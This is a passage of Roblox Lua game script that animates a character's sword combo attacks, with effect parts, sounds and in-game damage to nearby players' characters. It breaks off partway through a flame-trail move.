 LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(0.5+1*i,0.5,-1+1*i) * CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90), math.rad(0))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-45+135*i), math.rad(10+35*i), math.rad(0))
  LW.C0 = CFrame.new(-1+1*i,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(90),math.rad(0),math.rad(25+65*i))
  effect("Bright blue",0.2,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
    end 
 dmgdc()
 for i = 0 , 1 , 0.2 do
  LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90), math.rad(0))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(90+20*i), math.rad(45+5*i), math.rad(0))
  LW.C0 = CFrame.new(-0.25*i,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(90),math.rad(0),math.rad(90+10*i))
  effect("Bright blue",0.2,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
    end 
 attacktype = 2
 coroutine.resume(coroutine.create(function ()
 wait(0.25)
 attacktype = 1
 end))
 attack=false
 wait(0.15)
 wait()
 for i = 0 , 1 , 0.1 do
 if not attack then 
                wait()
  RW.C0 = CFrame.new(1.5-0.5*i,0.5,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(90-10*i), math.rad(90-45*i), math.rad(-45*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(110-110*i), math.rad(50-50*i), math.rad(0))
  LW.C0 = CFrame.new(-0.25-0.75*i,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(90-10*i),math.rad(-45*i),math.rad(100-55*i))
 end
    end 
 
end
function Combo1b()
attack=true
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1.5-0.5*i,0.5,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90), math.rad(0))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(110-155*i), math.rad(50-40*i), math.rad(0))
  LW.C0 = CFrame.new(-0.25-0.75*i,0.5,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(90),math.rad(0),math.rad(100-50*i))
    end 
 
cs(Head,1.5)
local tempmod = Instance.new("Model",swordholder)
for l = 1 , 20 do
local meshz = Instance.new("SpecialMesh")
meshz.Scale = Vector3.new(0.5,0.5,0.5)
meshz.MeshType = "Sphere"
local shellz = Instance.new("Part")
meshz.Parent = shellz
shellz.Anchored = false
shellz.formFactor = 0
shellz.Size = Vector3.new(1,1,1)
shellz.CFrame = hitbox.CFrame * CFrame.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
shellz.Parent = tempmod
shellz.Transparency = 0.5
shellz.BrickColor = BrickColor.new("Bright violet")
shellz.CanCollide = false
shellz.Reflectance = 0.25
local bv = Instance.new("BodyPosition") 
bv.Parent = shellz
bv.maxForce = Vector3.new(200000,200000,200000) 
bv.position = shellz.Position
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.025 do
wait()
shellz.Transparency = 1-1*i
end
shellz.Transparency = 0
end))
coroutine.resume(coroutine.create(function()
wait(0.05)
bv.position = hitbox.Position 
for i = 1 , 20 do
wait(0.1)
bv.position = shell.Position 
end
shellz.Parent = nil
end))
wait(0.01)
end
coroutine.resume(coroutine.create(function ()
wait(0.25)
tempmod.Parent = nil
end))
 for i = 0 , 1 , 0.2 do
  LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(1-0.5*i,0.5,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90), math.rad(0))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-45+135*i), math.rad(10), math.rad(0))
  LW.C0 = CFrame.new(-1+1.5*i,0.5,-1*i) * CFrame.fromEulerAnglesXYZ(math.rad(90),math.rad(0),math.rad(50+40*i))
 effect("Really red",0,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
    end 
local gyro = Instance.new("BodyGyro")
gyro.maxTorque = Vector3.new(math.huge,math.huge,math.huge)
gyro.P = gyro.P + 10000
local CF = Torso.CFrame
gyro.cframe = CF
gyro.Parent = Torso
dmgcnnct(hitbox)
ss(Head,1)
 for i = 0 , 1 , 0.1 do
 LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
 wait()
 gyro.cframe = CF * CFrame.Angles(0,math.rad(-360*i),0)
 effect("Really red",0,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
 end
ss(Head,1)
Hitdeb = 0
 for i = 0 , 1 , 0.1 do
 LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
 wait()
 gyro.cframe = CF * CFrame.Angles(0,math.rad(-360*i),0)
 effect("Really red",0,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
 end
dmgdc()
 attacktype = 3
 coroutine.resume(coroutine.create(function ()
 wait(0.5)
 attacktype = 1
 end))
 wait(0.15)
 wait()
gyro.Parent = nil
  attack=false
 for i = 0 , 1 , 0.1 do
 if not attack then 
                wait()
  RW.C0 = CFrame.new(0.5+0.5*i,0.5,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(90-10*i), math.rad(90-45*i), math.rad(-45*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(90-90*i), math.rad(10-10*i), math.rad(0))
  LW.C0 = CFrame.new(0.5-1.5*i,0.5,-1+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(90-10*i),math.rad(-45*i),math.rad(50-5*i))
 end
 end
end
 
function Combo1c()
attack=true
local bp = Instance.new("BodyPosition")
bp.maxForce = Vector3.new(math.huge,math.huge,math.huge)
bp.P = bp.P + 10000
local CF = Torso.CFrame
bp.position = CF.p
bp.Parent = Torso
RWLFunc()
LWLFunc()
for zz = 1 , 2  do
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "FileMesh"
mesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
mesh.Scale = Vector3.new(10,5,10) * Vector3.new(0.01,0.01,0.01)
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(1,1,1)
shell.CFrame = Torso.CFrame * CFrame.Angles(0,0.5*zz,0) + Vector3.new(0,-2.5,0) -- + shellspawn.CFrame.lookVector * 2
shell.Parent = swordholder
shell.Transparency = 0
shell.BrickColor = BrickColor.new("White")
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.05 do
wait()
mesh.Scale = Vector3.new(10,5,10) * Vector3.new(i,1,i)
shell.Transparency = 1*i
end
shell.Transparency = 1
shell.Parent = nil
end))
end
 for i = 0 , 1 , 0.1 do
 LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
 wait()
  RW.C0 = CFrame.new(0.5+0.5*i,0.5+1*i,0) * CFrame.fromEulerAnglesXYZ(math.rad(90+100*i), math.rad(90-90*i), math.rad(-45*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(90-90*i), math.rad(10-10*i), math.rad(0))
  LW.C0 = CFrame.new(0.5-1.5*i,0.5+1*i,-1+1*i) * CFrame.fromEulerAnglesXYZ(math.rad(90+100*i),math.rad(0),math.rad(50-5*i))
w1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90-45*i)) * CFrame.new(0, 0, 0.2)
 bp.position = CF.p + Vector3.new(0,10,0)
 RWL.C0 = CFrame.new(1, -1, 0) * CFrame.fromEulerAnglesXYZ(math.rad(-20*i), math.rad(0), math.rad(0))
 LWL.C0 = CFrame.new(-1, -1, 0) * CFrame.fromEulerAnglesXYZ(math.rad(-20*i), math.rad(0), math.rad(0))
 prt8.Transparency = 1-1*i
 effect("Really black",0,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
end
 cs(Head,1.5)
coroutine.resume(coroutine.create(function ()
local tempmod = Instance.new("Model",swordholder)
for l = 1 , 20 do
local meshz = Instance.new("SpecialMesh")
meshz.Scale = Vector3.new(1.5,1.5,1.5)
meshz.MeshType = "Sphere"
local shellz = Instance.new("Part")
meshz.Parent = shellz
shellz.Anchored = false
shellz.formFactor = 0
shellz.Size = Vector3.new(1,1,1)
shellz.CFrame = hitbox.CFrame * CFrame.new(math.random(-15,15),math.random(-15,15),math.random(-15,15))
shellz.Parent = tempmod
shellz.Transparency = 0.5
shellz.BrickColor = BrickColor.new("Really black")
shellz.CanCollide = false
shellz.Reflectance = 0
local bv = Instance.new("BodyPosition") 
bv.Parent = shellz
bv.maxForce = Vector3.new(200000,200000,200000) 
bv.position = shellz.Position
local hx = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.05 do
wait()
shellz.Transparency = 1-1*i
end
shellz.Transparency = 0
end))
coroutine.resume(coroutine.create(function()
wait(0.05)
bv.position = hitbox.Position 
for i = 1 , 20 do
wait(0.1)
bv.position = shell.Position 
end
shellz.Parent = nil
end))
wait(0.01)
end
coroutine.resume(coroutine.create(function ()
repeat wait() until hx
tempmod.Parent = nil
end))
end))
 for i = 0 , 1 , 0.1 do
 LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
 wait()
  RW.C0 = CFrame.new(1,1.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(190+20*i), math.rad(0), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,1.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(190+20*i),math.rad(0),math.rad(45))
  effect("Really black",0,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
 end
 for i = 0 , 1 , 0.1 do
 LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
 wait()
  RW.C0 = CFrame.new(1,1.5-1*i,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(210-130*i), math.rad(0), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,1.5-1*i,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(210-130*i),math.rad(0),math.rad(45))
w1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180*i), math.rad(45)) * CFrame.new(0, 0, 0.2)
 bp.position = CF.p + CF.lookVector * 2.5 + Vector3.new(0,-1,0)
 RWL.C0 = CFrame.new(1, -1+1*i, -1*i) * CFrame.fromEulerAnglesXYZ(math.rad(-20+20*i), math.rad(0), math.rad(0))
 LWL.C0 = CFrame.new(-1, -1+1*i, -1*i) * CFrame.fromEulerAnglesXYZ(math.rad(-20+20*i), math.rad(0), math.rad(0))
  effect("Really black",0,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0))
 end
 hx = true
 wait(0.1)
local Hit,A, B = Raycast(hitbox.Position + Vector3.new(0,3,0) + Torso.CFrame.lookVector * 1 ,hitbox.Position + Vector3.new(0,3,0) + Torso.CFrame.lookVector * 101 ,100)
local effectsmsh = Instance.new("CylinderMesh")
effectsmsh.Scale = Vector3.new(1,1,1)
local effectsg = Instance.new("Part")
effectsg.formFactor = 3
effectsg.CanCollide = false
effectsg.Name = "LAZOR"
effectsg.Locked = true
effectsg.Anchored = true
effectsg.Parent = swordholder
effectsmsh.Parent = effectsg
effectsg.BrickColor = BrickColor.new("Black")
effectsg.Reflectance = 0.5
local point1 = B
local point0 = A
for zz = 1 , 5  do
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "FileMesh"
mesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
mesh.Scale = Vector3.new(10,5,10) * Vector3.new(0.01,0.01,0.01)
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(1,1,1)
shell.CFrame = CFrame.new((point0+point1)/2,point1) + CFrame.new((point0+point1)/2,point1).lookVector * (((point0)-(point1)).magnitude /-2) + Torso.CFrame.lookVector * 2
shell.CFrame = shell.CFrame * CFrame.Angles(math.rad(-90),0.5*zz,0)
shell.Parent = swordholder
shell.Transparency = 0
if math.fmod(zz,2) == 0 then
shell.BrickColor = BrickColor.new("Really black")
else
shell.BrickColor = BrickColor.new("Bright violet")
end
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.01 do
wait()
mesh.Scale = Vector3.new(10,5,10) * Vector3.new(i,1,i)
shell.Transparency = 1*i
end
shell.Transparency = 1
shell.Parent = nil
end))
end
for zz = 1 , 1 do
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "Sphere"
mesh.Scale = Vector3.new(20,15,10) * Vector3.new(0.01,0.01,0.01)
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(1,1,1)
shell.CFrame = CFrame.new((point0+point1)/2,point1) + CFrame.new((point0+point1)/2,point1).lookVector * (((point0)-(point1)).magnitude /-2) + Torso.CFrame.lookVector * 10
shell.CFrame = shell.CFrame * CFrame.Angles(math.rad(-90),0,0)
shell.Parent = swordholder
shell.Transparency = 0
shell.BrickColor = BrickColor.new("Bright violet")
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.02 do
wait()
mesh.Scale = Vector3.new(10,15,15) * Vector3.new(i,1,i)
shell.CFrame = shell.CFrame * CFrame.Angles(0,i,0)
shell.Transparency = 1-1*i
end
for i = 0 , 1 , 0.05 do
wait()
shell.CFrame = shell.CFrame * CFrame.Angles(0,i,0)
shell.Transparency = 1*i
end
shell.Transparency = 1
shell.Parent = nil
end))
end
for zz = 1 , 1 do
local mesh = Instance.new("CylinderMesh")
mesh.Scale = Vector3.new(20,0.5,10) * Vector3.new(0.01,0.01,0.01)
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(1,1,1)
shell.CFrame = CFrame.new((point0+point1)/2,point1) + CFrame.new((point0+point1)/2,point1).lookVector * (((point0)-(point1)).magnitude /-2) + Torso.CFrame.lookVector * -0.5
shell.CFrame = shell.CFrame * CFrame.Angles(math.rad(-90),0,0)
shell.Parent = swordholder
shell.Transparency = 0
shell.BrickColor = BrickColor.new("Bright violet")
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.02 do
wait()
mesh.Scale = Vector3.new(20,0.5,20) * Vector3.new(i,1,i)
shell.Transparency = 1-1*i
end
for i = 0 , 1 , 0.02 do
wait()
shell.Transparency = 1*i
end
shell.Transparency = 1
shell.Parent = nil
end)) 
end
for zz = 1 , 10  do
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "FileMesh"
mesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
mesh.Scale = Vector3.new(5,5,5) * Vector3.new(0.01,0.01,0.01)
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(1,1,1)
shell.CFrame = CFrame.new((point0+point1)/2,point1) + CFrame.new((point0+point1)/2,point1).lookVector * (((point0)-(point1)).magnitude /2)
shell.CFrame = shell.CFrame * CFrame.Angles(math.rad(-90)+2*math.random(),2*math.random(),2*math.random())
shell.Parent = swordholder
shell.Transparency = 0
if math.fmod(zz,2) == 0 then
shell.BrickColor = BrickColor.new("Really black")
else
shell.BrickColor = BrickColor.new("Bright violet")
end
shell.CanCollide = false
coroutine.resume(coroutine.create(function()
for i = 0 , 1 , 0.01 do
wait()
mesh.Scale = Vector3.new(25,25,25) * Vector3.new(i,i,i)
shell.Transparency = 1*i
end
shell.Transparency = 1
shell.Parent = nil
end))
end
coroutine.resume(coroutine.create(function()
effectsg.Transparency = 1
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1-1*i
end
wait(2)
for i = 0 , 1 , 0.1 do
wait()
effectsg.Transparency = 1*i
end
effectsg.Parent = nil
end))
local mg = 100
if Hit ~= nil then
mg = (point0-point1).magnitude
elseif Hit == nil then
mg = 100
end
ls(Head,0.5)
ls(Head,0.75)
cs(Head,0.25)
ls(Head,1)
ls(Head,3)
cs(Head,0.15)
for mgg = 0 , 1,0.1 do
wait()
effectsg.Size = Vector3.new(5,(mg*mgg)+0.2,5)
local durr = CFrame.new((point0+(point1))/2,(point1))
effectsg.CFrame = CFrame.new((point0+(point1-durr.lookVector * (mg*(1-mgg))))/2,(point1)) * CFrame.Angles(math.rad(90),0,0)
end
local critrandomizer = math.random(1,crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage+30,maxdamage+30)
AoEP((CFrame.new((point0+point1)/2,point1) + CFrame.new((point0+point1)/2,point1).lookVector * (((point0)-(point1)).magnitude /2)).p,15,rndmdamage+darkboost,false) 
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage+30,crtmaxdamage+30)
AoEP((CFrame.new((point0+point1)/2,point1) + CFrame.new((point0+point1)/2,point1).lookVector * (((point0)-(point1)).magnitude /2)).p,15,rndmdamage+darkboost,true)
end
bp.Parent = nil
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1,1-0.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80), math.rad(90-45*i), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80),math.rad(-45*i),math.rad(45))
w1.C1 = CFrame.fromEulerAnglesXYZ(0, 0, 0) * CFrame.new(0, 0,0)
w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180-180*i), math.rad(45+45*i)) * CFrame.new(0, 0, 0.2)
 RWL.C0 = CFrame.new(1, -1*i, -1+1*i) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
 LWL.C0 = CFrame.new(-1, -1*i, -1+1*i) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
 prt8.Transparency = 1*i
    end 
  for ii = 1 , #AoETrue do
  table.remove(AoETrue,#AoETrue)
  end
RWLRem()
LWLRem()
attack = false
attacktype = 1
end
function BlizzardSword()
attack=true
 for i = 0 , 1 , 0.2 do
                wait()
  RW.C0 = CFrame.new(1,0.5+1*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80+55*i), math.rad(45-45*i), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,0.5+1*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80+55*i),math.rad(-45+45*i),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(90-45*i)) * CFrame.new(0, 0, 0.2)
    end 
 local wssave = Character.Humanoid.WalkSpeed
 Character.Humanoid.WalkSpeed = 0
 ss(Head,1.5)
 local efftab = {}
 for i = 0 , 1 , 0.2 do
   LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(1,1.5-1.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(135-135*i), math.rad(0), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,1.5-1.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(135-135*i),math.rad(0),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(45)) * CFrame.new(0, 0, 0.2)
  local eff = effect("Bright blue",0.2,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0),true)
  table.insert(efftab,eff)
    end 
local trspos = Torso.Position
 Character.Humanoid.WalkSpeed = wssave
 for _,efff in pairs(efftab) do
 wait()
 coroutine.resume(coroutine.create(function()
 for i = 0 , 1 , 0.15 do 
 wait()
 efff.Transparency = 1*i
 end 
 wait()
 efff.Transparency = 1
 end))
 end
 for io,eff in pairs(efftab) do
 wait()
for zz = 1 , 1 do
local mesh = Instance.new("CylinderMesh")
mesh.Scale = Vector3.new(0.1,0.5,0.1)
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(1,1,1)
local dur = CFrame.new(trspos,eff.Position)
local CF1 = dur * CFrame.Angles(math.rad(90),0,0) * CFrame.new(0,-6,0)
shell.CFrame = CF1
shell.Parent = eff
shell.Transparency = 1
shell.Reflectance = 0.25
shell.BrickColor = BrickColor.new("Bright blue")
shell.CanCollide = false
is(shell,0.5)
 coroutine.resume(coroutine.create(function()
 for i = 0 , 1 , 0.1 do 
 wait()
 shell.Transparency = 1-1*i
 mesh.Scale = Vector3.new(0.1+4.9*i,0.5,0.1+4.9*i)
 end
 wait(0.25)
 for i = 0 , 1 , 0.1 do 
 wait()
 shell.Transparency = 1*i
 mesh.Scale = Vector3.new(5-5*i,0.5-0.5*i,5-5*i)
 end
 shell.Parent = nil
 end))
end
end
 for io,eff in pairs(efftab) do
 wait()
for zz = 1 , 1 do
local mesh = Instance.new("SpecialMesh")
mesh.MeshType = "FileMesh"
mesh.Scale = Vector3.new(5,2,1)
mesh.MeshId = "rbxasset://fonts/sword.mesh"
local shell = Instance.new("Part")
mesh.Parent = shell
shell.Anchored = true
shell.formFactor = 1
shell.Size = Vector3.new(2,2,5)
local dur = CFrame.new(trspos,eff.Position)
local CF1 = dur * CFrame.Angles(math.rad(180),0,0) * CFrame.new(0,0,6.5)* CFrame.Angles(0,0,math.rad(90)) 
shell.CFrame = CF1
shell.Parent = eff
shell.Transparency = 1
shell.Reflectance = 0.25
shell.BrickColor = BrickColor.new("Bright blue")
shell.CanCollide = false
local hitd = 0
coroutine.resume(coroutine.create(function() 
local dd = false
while shell.Parent ~= nil and not dd do
wait() 
local c = game.Workspace:GetChildren(); 
for i = 1, #c do 
local hum = c[i]:findFirstChild("Humanoid") 
if hum ~= nil and hum.Health ~= 0 then 
local head = c[i]:findFirstChild("Torso"); 
if head ~= nil then 
local targ = head.Position - shell.Position; 
local mag = targ.magnitude; 
if mag <= 3 and c[i].Name ~= Player.Name then 
dd = true
local critrandomizer = math.random(1,crtrate)
if critrandomizer ~= 1 then
local rndmdamage = math.random(mindamage+iceboost,maxdamage+iceboost)
damagesplat(rndmdamage,head,false)
hum:TakeDamage(rndmdamage)
elseif critrandomizer == 1 then
local rndmdamage = math.random(maxdamage+iceboost,crtmaxdamage+iceboost)
damagesplat(rndmdamage,head,true)
hum:TakeDamage(rndmdamage)
end
end 
end 
end 
end 
end 
end)) 
 coroutine.resume(coroutine.create(function()
 uss(eff,1)
 
 for i = 0 , 1 , 0.1 do 
 wait()
 shell.Transparency = 1-1*i
CF1 = dur * CFrame.Angles(math.rad(180),0,0) * CFrame.new(0,0,6.5+2*i)* CFrame.Angles(0,0,math.rad(90)) 
 shell.CFrame = CF1
 mesh.Scale = Vector3.new(5,2,1+0.5*i)
 end
 wait(0.25)
 ss(eff,2)
 for i = 0 , 1 , 0.1 do 
 wait()
 shell.Transparency = 1*i
CF1 = dur * CFrame.Angles(math.rad(180),0,0) * CFrame.new(0,0,8.5+25*i)* CFrame.Angles(0,0,math.rad(90)) 
 shell.CFrame = CF1
 mesh.Scale = Vector3.new(5-5*i,2-2*i,1.5-1.5*i*i)
 end
 shell.Parent = nil
 end))
end
end
 coroutine.resume(coroutine.create(function()
 wait(1.5)
 for _,eff in pairs(efftab) do
 wait()
 eff.Parent = nil
 end end))
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1,0.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80*i), math.rad(45*i), math.rad(-45))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(0), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1,0.5*i,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80*i),math.rad(-45*i),math.rad(45))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(0), math.rad(45+45*i)) * CFrame.new(0, 0, 0.2)
    end 
 attack=false
end
local FTCount = 0
function FlameTrail()
attack=true
 for i = 0 , 1 , 0.15 do
                wait()
  RW.C0 = CFrame.new(1-0.5*i,0.5,-0.5-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80+10*i), math.rad(45+45*i), math.rad(-45+55*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-45*i), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1+0.5*i,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80),math.rad(-45),math.rad(45+20*i))
     end 
 wait(0.1)
 ss(Head,1.5)
 fs(Head,0.5+1.5*math.random())
 local efftab = {}
  RW.C0 = CFrame.new(0.5,0.5,-1) * CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90), math.rad(10))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-45), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-0.5,0.5,-0.5) * CFrame.fromEulerAnglesXYZ(math.rad(80),math.rad(-45),math.rad(65))
 dmgcnnct(hitbox)
 for i = 0 , 1 , 0.15 do
  LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(0.5+1*i,0.5,-1+1*i) * CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(90), math.rad(10))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(-45+135*i*i), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-0.5-1*i,0.5,-0.5+0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(80+20*i),math.rad(-45),math.rad(65-155*i))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180*i), math.rad(90)) * CFrame.new(0, 0, 0.2)
  if FTCount <= MaxFT then
  local eff = effect("Bright red",0.2,LastPoint,hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0),true)
  eff.Transparency = 1
  table.insert(efftab,eff)
  FTCount = FTCount + 1
  OTND(eff)
 coroutine.resume(coroutine.create(function()
 for i = 0 , 1 , 0.15 do 
 wait()
 eff.Transparency = 1-0.5*i
 end 
 wait()
 eff.Transparency = 0.5
 end))
 end
     end 
 local rndmneg = math.random(1,2)
 if rndmneg == 1 then
 rndmdec1 = 13 * math.random()
 else
 rndmdec1 = -13 * math.random()
 end
 for i = 0 , 1 , 0.1 do
                wait()
  RW.C0 = CFrame.new(1.5,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(90-rndmdec1*i), math.rad(90), math.rad(10-(rndmdec1*2)*i))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(90+20*i), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1.5,0.5,-0) * CFrame.fromEulerAnglesXYZ(math.rad(100),math.rad(-45),math.rad(-90))
  w1.C1 = CFrame.fromEulerAnglesXYZ(0, math.rad(0), 0) * CFrame.new(0, 0,0)
  w1.C0 = CFrame.fromEulerAnglesXYZ(math.rad(90), math.rad(180), math.rad(90)) * CFrame.new(0, 0, 0.2)
     end 
 ss(Head,1.5)
 fs(Head,0.5+1.5*math.random())
 Hitdeb = 0
 for i = 0 , 1 , 0.15 do
  LastPoint = hitbox.CFrame * CFrame.new(0,hitbox.Size.y/2,0)
                wait()
  RW.C0 = CFrame.new(1.5-1.5*i,0.5,-1*i) * CFrame.fromEulerAnglesXYZ(math.rad(90-rndmdec1), math.rad(90), math.rad(10-(rndmdec1*2)))
  RW.C1 = CFrame.new(0,0.5,0) * CFrame.fromEulerAnglesXYZ(math.rad(110-200*i), math.rad(0), math.rad(0))
  LW.C0 = CFrame.new(-1.5+1*i,0.5,-0.5*i) * CFrame.fromEulerAnglesXYZ(math.rad(100-80*i),math.rad(-45),math.rad(-90+135*i))
